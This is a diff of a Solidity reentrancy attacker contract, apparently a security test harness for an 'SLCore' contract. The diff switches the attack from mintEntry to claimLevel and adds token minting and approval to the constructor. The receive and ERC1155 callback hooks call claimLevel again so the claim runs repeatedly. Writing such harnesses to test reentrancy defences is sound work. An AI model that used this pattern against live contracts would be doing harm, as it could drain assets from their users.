@@ -3,23 +3,33 @@ pragma solidity ^0.8.0;
 
 import "./SLCore.sol";
 import "./ISLCore.sol";
+import "./IPaymentToken.sol";
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
-contract AttackSLCoreEntry {
+contract AttackSLCoreClaimLevel {
     ISLCore public slCore;
 
-    constructor(address _slCoreAddress) {
+    constructor(
+        address _slCoreAddress,
+        address paymentToken,
+        address spender,
+        uint256 amount
+    ) {
         slCore = ISLCore(_slCoreAddress);
+        mintERC20(paymentToken, 5_000_000_000);
+        approveERC20(paymentToken, spender, amount);
+        slCore.mintEntry();
+        slCore.mintTest(1);
     }
 
     // Fallback function to repeatedly call the victim contract
     receive() external payable {
-        slCore.mintEntry();
+        slCore.claimLevel();
     }
 
     // Function to initiate the attack
     function startAttack() public {
-        slCore.mintEntry();
+        slCore.claimLevel();
     }
 
     function approveERC20(
@@ -30,6 +40,10 @@ contract AttackSLCoreEntry {
         IERC20(paymentToken).approve(spender, amount);
     }
 
+    function mintERC20(address paymentToken, uint256 amount) public {
+        IPaymentToken(paymentToken).mint(amount);
+    }
+
     function onERC1155Received(
         address,
         address,
@@ -37,7 +51,8 @@ contract AttackSLCoreEntry {
         uint256,
         bytes memory
     ) public virtual returns (bytes4) {
-        slCore.mintEntry();
+        slCore.claimLevel();
+
         return this.onERC1155Received.selector;
     }
 
@@ -48,7 +63,7 @@ contract AttackSLCoreEntry {
         uint256[] memory,
         bytes memory
     ) public virtual returns (bytes4) {
-        slCore.mintEntry();
+        slCore.claimLevel();
         return this.onERC1155BatchReceived.selector;
     }
 
